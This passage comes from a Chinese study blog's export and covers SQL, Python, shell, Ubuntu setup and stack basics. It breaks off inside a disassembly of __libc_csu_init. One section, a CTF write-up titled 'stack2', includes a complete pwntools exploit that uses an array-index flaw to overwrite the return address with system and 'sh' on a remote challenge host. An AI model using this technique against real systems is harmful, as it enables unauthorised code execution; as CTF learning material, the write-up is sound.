<h2 id="常用SQL命令"><a href="#常用SQL命令" class="headerlink" title="常用SQL命令"></a>常用SQL命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT - 从数据库中提取数据</span><br><span class="line">UPDATE - 更新数据库中的数据</span><br><span class="line">DELETE - 删除数据</span><br><span class="line">INSERT INTO - 向数据库中插入新数据</span><br><span class="line">CREATE - 创建</span><br><span class="line">ALTER </span><br><span class="line">DROP    - 删除</span><br><span class="line">where</span><br><span class="line">and or</span><br><span class="line">distinct</span><br><span class="line">order by</span><br><span class="line">like</span><br><span class="line">in</span><br><span class="line">between</span><br><span class="line">as</span><br><span class="line">union</span><br><span class="line">view</span><br></pre></td></tr></table></figure>

<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代 0 个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[<em>charlist</em>]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<h2 id="库的基本操作"><a href="#库的基本操作" class="headerlink" title="库的基本操作"></a>库的基本操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database &lt;数据库名&gt;		#创建数据库</span><br><span class="line">drop database &lt;数据库名&gt;		#删除数据库</span><br><span class="line">use &lt;数据库名&gt;					#进入相应数据库（也可以在图形界面直接点击）</span><br></pre></td></tr></table></figure>

<h2 id="表的基本操作"><a href="#表的基本操作" class="headerlink" title="表的基本操作"></a>表的基本操作</h2><blockquote>
<p>设有表<code>stu</code>包括<code>name</code>和<code>age</code>两个字段,类型是<code>varchar(30)</code>和<code>smallint</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table stu(name varchar(30),age smallint)   #创建数据库表</span><br><span class="line">				#可以在数据类型后面加 default &lt;value&gt; 设置默认值</span><br><span class="line">				#也可以在数据类型后面设置是否为主键等</span><br><span class="line"></span><br><span class="line">desc stu		#查看指定表的结构(字段和对应类型)</span><br><span class="line"></span><br><span class="line">insert into stu(name,age) values(&apos;a&apos;,1)         #向表内插入一条数据‘a’和1</span><br><span class="line">		#stu()的字段内容可不填，但这样values()内值的数量与类型要与表的字段一一对应</span><br><span class="line">		</span><br><span class="line">select name,age from stu			#查找表内对应字段的内容</span><br><span class="line">		# select * from table  查询表的全部字段内容</span><br><span class="line">		</span><br><span class="line">drop table &lt;表名&gt;				#删除表</span><br><span class="line">set &lt;字段名&gt; utf8				#设置字段名的字符集</span><br></pre></td></tr></table></figure>

<h3 id="创建用户-设置权限"><a href="#创建用户-设置权限" class="headerlink" title="创建用户,设置权限"></a>创建用户,设置权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create login &lt;登录名&gt; with password =&apos;密码&apos;,default_database=&lt;数据库名&gt;</span><br><span class="line">#创建登录使用的一个用户，类似 root</span><br><span class="line"></span><br><span class="line">create user &lt;用户名&gt; for login &lt;登录名&gt; with default_schema=&lt;表名&gt;</span><br><span class="line">#为登录时的用户创建某个表的用户</span><br><span class="line"></span><br><span class="line">grant &lt;权限&gt; on &lt;表名&gt; to &lt;用户名&gt;  (with grant option  加上后给了用户授权的权限)</span><br><span class="line">#给某个用户某个表的权限</span><br><span class="line"></span><br><span class="line">revoke &lt;权限&gt; on &lt;表名&gt; from &lt;用户名&gt;</span><br><span class="line"></span><br><span class="line">flush privileges; </span><br><span class="line">#刷新系统权限表</span><br><span class="line"></span><br><span class="line">show grants for &lt;用户名&gt;	</span><br><span class="line">#查看用户权限</span><br></pre></td></tr></table></figure>

<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 	#查询</span><br><span class="line">insert	#添加</span><br><span class="line">update	#更改	</span><br><span class="line">delete	#删除</span><br><span class="line">create 	#创建</span><br><span class="line">alter	#修改</span><br><span class="line">drop	#删除</span><br><span class="line">index	#索引</span><br><span class="line">create view	#创建视图</span><br><span class="line">show view	#查看视图</span><br><span class="line"></span><br><span class="line">all privilege	#所有权限</span><br></pre></td></tr></table></figure>

<h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><blockquote>
<p>方便权限的管理操作，（我看做把权限打包给一个角色）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create role  r1</span><br><span class="line">#创建角色</span><br><span class="line"></span><br><span class="line">grant &lt;权限&gt; on &lt;表名&gt; to r1  (with grant option  加上后给了用户授权的权限)</span><br><span class="line">#给角色某个表的权限</span><br><span class="line"></span><br><span class="line">revoke &lt;权限&gt; on &lt;表名&gt; from &lt;用户名&gt;</span><br><span class="line">#回收角色的某个权限</span><br><span class="line"></span><br><span class="line">grant r1 to &lt;用户名&gt;</span><br></pre></td></tr></table></figure>

<h3 id="敏感度标记（作为了解）"><a href="#敏感度标记（作为了解）" class="headerlink" title="敏感度标记（作为了解）"></a>敏感度标记（作为了解）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">敏感度标记分成若干级别</span><br><span class="line">绝密(Top Secret,TS )</span><br><span class="line">机密(Secret, S)</span><br><span class="line">可信(Confidential, C)</span><br><span class="line">公开(Public,P)</span><br><span class="line"></span><br><span class="line">TS&gt;=S&gt;=C&gt;=P</span><br></pre></td></tr></table></figure>

<ul>
<li>仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取客体</li>
<li>仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体</li>
</ul>
]]></content>
      <categories>
        <category>命令</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>python基本数据类型</title>
    <url>/2019/08/08/python/</url>
    <content><![CDATA[<a id="more"></a>




<p>python在写代码时不用声明变量</p>
<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
其中包括他们的基本用法和其常用的方法，这里会一一列举出来
然后我们还需要了解一些运算符，
因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
<p>1、数字  —&gt; int类</p>
<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
<p>2、布尔值  </p>
<p>—&gt;bool类
　　</p>
<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
<p>—》</p>
<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
<p>3、字符串  </p>
<p>—&gt;str类</p>
<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
<p>#一</p>
<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;

截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
<p>索引         index()、find()</p>
<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个

        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
<pre><code>#删除字符串，也是删除变量
&gt;&gt;&gt; name =&quot;little-five&quot;
&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
<pre><code>isalnum()    #判断是否全为数字
isalpha()    #判断是否全为字母
isdigit()    #判断是否全为数字或者字母

返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
<pre><code>#大小写的互相转换    s.swapcase()
#首字母大写        s.capitalize()
#全部转为小写        s.lower()
#全部转为大写        s.upper()</code></pre><p>jion方法</p>
<pre><code>#join--&gt; join(): 连接字符串数组。
将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串

#字符串
name =&quot;littefive&quot;
&quot;-&quot;.join(name)
&apos;l-i-t-t-e-f-i-v-e&apos;

#列表
info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
&quot;--&quot;.join(info)
&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
 #或者
names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
<p>　pop()        取出</p>
<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量

name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
<pre><code>#元组
name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
print(name[0])</code></pre><p>#四.<br>字典        dict类
　　　 </p>
<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
　</p>
<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
<p>而值的定义可以是任意数据类型。</p>
<pre><code>#字典的定义

info ={
    1:&quot;hello world&quot;,  #键为数字
    (&quot;hello world&quot;):1, #键为元组
    False:{&quot;name&quot;:&quot;James&quot;},
    &quot;age&quot;:22
}    </code></pre><p>遍历        items、keys、values</p>
<pre><code>info ={
   &quot;name&quot;:&quot;little-five&quot;,
   &quot;age&quot;:22,
   &quot;email&quot;:&quot;99426353*@qq,com&quot;
}
#键
for key in info:
    print(key)
    print(info.keys())
    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>语言基础</tag>
      </tags>
  </entry>
  <entry>
    <title>shell</title>
    <url>/2019/10/09/shell/</url>
    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
<p>#基本上shell分两大类：</p>
<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。

文字操作系统与外部最主要的接口就叫做shell。
shell是操作系统最外面的一层。
shell管理你与操作系统之间的交互：
等待你输入，向操作系统解释你的输入，
并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
<p>###交互式shell和非交互式shell</p>
<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
]]></content>
      <tags>
        <tag>计算机基础概念</tag>
      </tags>
  </entry>
  <entry>
    <title>stack2</title>
    <url>/2019/10/11/stack2/</url>
    <content><![CDATA[<p>1.file命令查看为32位</p>
<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
<p>3.做题首先运行一下，查看程序的运行过程</p>
<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
<pre><code>#!/usr/bin/python
#coding:utf-8

from pwn import*






system_addr=0x080485AF
leave_offset=0x84


def write_addr(addr,va):
    io.sendline(&quot;3&quot;)
    io.recvuntil(&quot;which number to change:\n&quot;)
    io.sendline(str(addr))
    io.recvuntil(&quot;new number:\n&quot;)
    io.sendline(str(va))
    io.recvuntil(&quot;5. exit\n&quot;)

io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
io.recvuntil(&quot;How many numbers you have:\n&quot;)
io.sendline(&quot;1&quot;)
io.recvuntil(&quot;Give me your numbers\n&quot;)
io.sendline(&quot;1&quot;)
io.recvuntil(&quot;5. exit\n&quot;)


# write  system_addr  0x08048450

write_addr(leave_offset,0X50)
write_addr(leave_offset+1,0X84)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
# sh_addr  0x08048987
leave_offset+=8
print leave_offset
write_addr(leave_offset,0x87)
write_addr(leave_offset+1,0X89)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)

io.sendline(&quot;5&quot;)
io.interactive()    </code></pre>]]></content>
      <tags>
        <tag>做题题解</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu16.04配置</title>
    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
<p>#拍快照</p>
<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
<p>如果提示 的是 路径， 则直接回车就好。</p>
<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
https://www.cnblogs.com/flyinggod/p/7979108.html
不推荐：https://blog.csdn.net/xkwy100/article/details/80301156

解决问题E: Could not get lock /var/lib/apt/lists/lock
https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
<pre><code>安装：  sudo apt install python-pip

遇到问题，    
        Unable to locate package python-pip
解决方法： 更新软件源
        sudo apt-get update

网址    https://www.jianshu.com/p/568aab038d4c
    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
<pre><code>sudo mkdir ~/.pip/
cd ./.pip/
touch pip.conf
sudo gedit pip.conf 

网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
]]></content>
      <tags>
        <tag>虚拟机配置</tag>
      </tags>
  </entry>
  <entry>
    <title>stack</title>
    <url>/2019/09/27/stack_explain/</url>
    <content><![CDATA[<a id="more"></a>


<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
<pre><code>push   ebp       压栈 esp减小 存入ebp内容
mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
<p>一个栈帧从高地址到低地址应该是</p>
<pre><code>函数参数
函数返回地址
ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
栈内数据
esp  </code></pre><p>待更新。。</p>
]]></content>
      <tags>
        <tag>有关栈</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机配置</title>
    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
<p><strong>2.安装VMtools</strong></p>
<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>

<p><strong>3.更换软件源</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
<p><strong>4.安装pip</strong></p>
<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
<p>安装直接在终端输入：  sudo apt install python-pip</p>
<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
<p>创建一个配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>

<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
<p><strong>6.安装pwntools</strong></p>
<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
]]></content>
      <tags>
        <tag>虚拟机配置</tag>
      </tags>
  </entry>
  <entry>
    <title>通用gadget原理分析</title>
    <url>/2019/11/01/%E9%80%9A%E7%94%A8gadget%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>通用 gadget</p>
<p>__libc_csu_init()</p>
<p>我们知道在程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的，所以我们可以考虑在这些函数中找到一些通用的 gadget，在 x64 程序中，就存在这样的 gadget。x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。</p>
<p>函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。由于每个版本的 libc 都有一定区别，这里的版本如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ file /usr/lib/libc<span class="number">-2.26</span>.so</span><br><span class="line">/usr/lib/libc<span class="number">-2.26</span>.so: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f46739d962ec152b56d2bdb7dadaf8e576dbf6eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble /r __libc_csu_init</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __libc_csu_init:</span><br><span class="line">   <span class="number">0x00000000004007d0</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">41</span> <span class="number">57</span>   push   r15</span><br><span class="line">   <span class="number">0x00000000004007d2</span> &lt;+<span class="number">2</span>&gt;:     <span class="number">41</span> <span class="number">56</span>   push   r14</span><br><span class="line">   <span class="number">0x00000000004007d4</span> &lt;+<span class="number">4</span>&gt;:     <span class="number">49</span> <span class="number">89</span> d7        mov    r15,rdx</span><br><span class="line">   <span class="number">0x00000000004007d7</span> &lt;+<span class="number">7</span>&gt;:     <span class="number">41</span> <span class="number">55</span>   push   r13</span><br><span class="line">   <span class="number">0x00000000004007d9</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">41</span> <span class="number">54</span>   push   r12</span><br><span class="line">   <span class="number">0x00000000004007db</span> &lt;+<span class="number">11</span>&gt;:    <span class="number">4</span>c <span class="number">8</span>d <span class="number">25</span> <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    r12,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600df8</span></span><br><span class="line">   <span class="number">0x00000000004007e2</span> &lt;+<span class="number">18</span>&gt;:    <span class="number">55</span>      push   rbp</span><br><span class="line">   <span class="number">0x00000000004007e3</span> &lt;+<span class="number">19</span>&gt;:    <span class="number">48</span> <span class="number">8</span>d <span class="number">2</span>d <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    rbp,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600e00</span></span><br><span class="line">   <span class="number">0x00000000004007ea</span> &lt;+<span class="number">26</span>&gt;:    <span class="number">53</span>      push   rbx</span><br><span class="line">   <span class="number">0x00000000004007eb</span> &lt;+<span class="number">27</span>&gt;:    <span class="number">41</span> <span class="number">89</span> fd        mov    r13d,edi</span><br><span class="line">   <span class="number">0x00000000004007ee</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">49</span> <span class="number">89</span> f6        mov    r14,rsi</span><br><span class="line">   <span class="number">0x00000000004007f1</span> &lt;+<span class="number">33</span>&gt;:    <span class="number">4</span>c <span class="number">29</span> e5        sub    rbp,r12</span><br><span class="line">   <span class="number">0x00000000004007f4</span> &lt;+<span class="number">36</span>&gt;:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>     sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004007f8</span> &lt;+<span class="number">40</span>&gt;:    <span class="number">48</span> c1 fd <span class="number">03</span>     sar    rbp,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x00000000004007fc</span> &lt;+<span class="number">44</span>&gt;:    ff <span class="number">15</span> f6 <span class="number">07</span> <span class="number">20</span> <span class="number">00</span>       call   QWORD PTR [rip+<span class="number">0x2007f6</span>]        # <span class="number">0x600ff8</span></span><br><span class="line">   <span class="number">0x0000000000400802</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">48</span> <span class="number">85</span> ed        test   rbp,rbp</span><br><span class="line">   <span class="number">0x0000000000400805</span> &lt;+<span class="number">53</span>&gt;:    <span class="number">74</span> <span class="number">1f</span>   je     <span class="number">0x400826</span> &lt;__libc_csu_init+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400807</span> &lt;+<span class="number">55</span>&gt;:    <span class="number">31</span> db   xor    ebx,ebx</span><br><span class="line">   <span class="number">0x0000000000400809</span> &lt;+<span class="number">57</span>&gt;:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line">   <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line">   <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line">   <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">   <span class="number">0x000000000040081d</span> &lt;+<span 